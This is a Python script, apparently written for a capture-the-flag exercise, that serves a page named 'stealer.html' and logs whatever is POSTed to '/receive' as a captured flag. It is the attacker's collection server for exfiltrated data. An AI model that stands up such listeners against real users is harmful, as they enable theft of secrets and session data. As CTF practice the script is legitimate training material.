from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

PORT = 3000

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/stealer.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("stealer.html", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        if self.path == "/receive":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            print("🔥 FLAG nhận được:", post_data.decode())
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

def run():
    server_address = ("", PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"🚀 Server chạy tại http://localhost:{PORT}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
